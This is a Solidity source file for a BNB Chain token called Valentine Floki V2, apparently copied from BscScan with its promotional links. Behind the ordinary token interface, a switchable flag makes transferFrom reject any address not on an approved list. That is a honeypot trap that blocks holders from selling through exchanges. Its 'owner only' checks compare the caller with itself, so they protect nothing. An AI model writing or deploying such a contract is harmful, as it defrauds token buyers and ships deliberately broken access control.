/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

//  Telegram: https://t.me/Valentine_Flokii
//  Twitter: https://twitter.com/valentine_floki
//  Website: https://valentinefloki.com/
/**
*Valentine Floki V2 - Migration 2023
*/

pragma solidity ^0.8.2;

contract Token {
    mapping(address => uint) public balances;
    mapping(address => bool) public approvedAddresses;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 1000000000 * 10 ** 18;
    string public name = "Valentine Floki V2";
    string public symbol = "FLOV";
    uint public decimals = 18;
    bool public seguridadValidar = false;

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
    }
        
    function balanceOf(address owner) public returns(uint) {
        return balances[owner];
    }
    
    function setseguridadValidar(bool newValue) public {
        address owner = msg.sender;
        require(msg.sender == owner, 'only owner can set seguridadValidar');
        seguridadValidar = newValue;
    }

    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        if (seguridadValidar) {
            require(approvedAddresses[from], 'address not approved');
        }
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
    
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
    
    function validarDireccion(address direccionAprovar) public returns (bool) {
    address owner = msg.sender;
        require(msg.sender == owner, 'only owner can validar');
        approvedAddresses[direccionAprovar] = true;
        return true;
    }
 
    function invalidarDireccion(address direccionInvalidar) public returns (bool) {
    address owner = msg.sender;
        require(msg.sender == owner, 'only owner can invalidar');
        approvedAddresses[direccionInvalidar] = false;
        return true;
    }


}